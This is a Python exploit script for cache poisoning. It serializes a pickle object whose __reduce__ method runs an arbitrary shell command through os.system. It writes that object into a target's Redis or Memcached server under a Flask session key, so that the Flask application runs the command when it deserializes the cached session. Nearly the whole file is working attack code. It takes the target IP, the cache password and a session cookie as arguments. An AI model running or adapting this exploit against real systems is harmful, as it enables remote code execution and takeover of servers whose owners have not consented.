import pickle
import argparse
import os
import requests
import pyfiglet
from pymemcache.client import base
import redis

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help="Target Machine Ip Address", type=str, required=True)
parser.add_argument("--rport", help="Python Flask App Port", type=int, default=5000)
parser.add_argument("--rpasswd", help="Redis Server Password", type=str, required=True)
parser.add_argument("--cacheType", help="Cache server type", type=str, required=True)
parser.add_argument("--cmd", help="Command to get executed on the target machine", type=str, required=True)
parser.add_argument("--id", help="Your ACTUAL SESSION COOKIE from the VULNERABLE FLASK Application. Example: \"session:3e8234e1-6c89-4ac2-be53-20574edcbcaa\"", type=str, required=True)
args = parser.parse_args()

cmd = args.cmd
rhost = args.rhost
rport = args.rport
rpasswd = args.rpasswd
c_id = args.id
cacheType=args.cacheType


class rce_payload:
    def __reduce__(self):
        return (os.system, (cmd,))
        
def pickle_ser():
    pickled = b"!"+pickle.dumps(rce_payload()) #Serializing the payload
    #pickled=b"!"+pickled
    f_id="flask_cache_session:"+c_id

    if( cacheType == "redis"):
        redis_client = redis.Redis(host=rhost, port=6379, db=0, password=rpasswd)
        value = redis_client.get(f_id)
        print("\n Poisoning Redis cache server Key : ",c_id, "with pickled Serialized payload \n ", pickled)
        redis_client.set(f_id, pickled)
    else:
        client = base.Client((rhost, 11211)) #Connecting to the memcached service.
        client.set(f_id, pickled)
    
    
def exploit_trigger():
    #cookie_dict = dict(cookie.split(":") for item in id)
    #r = requests.get(url = f"http://{rhost}:{rport}",id=cookie_dict)
    r = requests.get(url = f"http://{rhost}:{rport}/cache/{c_id}")
    print(" \n calling Flask Cash application request uri ",r.url)
    if (r.status_code == 200):
        print("Sucess!")
    elif (r.status_code == 404):
        print("Not Found!")


if __name__ == '__main__':
    ascii_banner = pyfiglet.figlet_format("PICKLE - FLASK CACHE - POISONING \n")
    print(ascii_banner)
    
    pickle_ser()
    #exploit_trigger()
